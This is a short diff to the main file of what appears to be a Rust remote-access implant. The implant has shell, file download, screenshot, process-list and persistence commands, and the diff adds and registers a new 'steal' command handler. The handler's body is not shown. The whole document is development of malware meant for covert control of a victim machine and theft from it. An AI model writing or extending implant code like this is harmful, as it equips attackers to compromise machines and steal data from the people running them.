@@ -6,7 +6,7 @@ mod persistence;
 mod dispatcher;
 mod commands;
 
-use commands::{shell, file_list, file_download, screenshot, process_list, persist_status, persist_remove};
+use commands::{shell, file_list, file_download, screenshot, process_list, persist_status, persist_remove, steal};
 use oxide_shared::packet::Packet;
 use rand::Rng;
 use std::time::Duration;
@@ -27,6 +27,7 @@ async fn main() -> anyhow::Result<()> {
     dispatch.register("process_list", Box::new(process_list::ProcessListHandler));
     dispatch.register("persist_status", Box::new(persist_status::PersistStatusHandler));
     dispatch.register("persist_remove", Box::new(persist_remove::PersistRemoveHandler));
+    dispatch.register("steal", Box::new(steal::StealHandler));
 
     let stable_path = persistence::copy_to_stable().unwrap_or_else(|e| {
         eprintln!("[!] copy_to_stable: {e}");
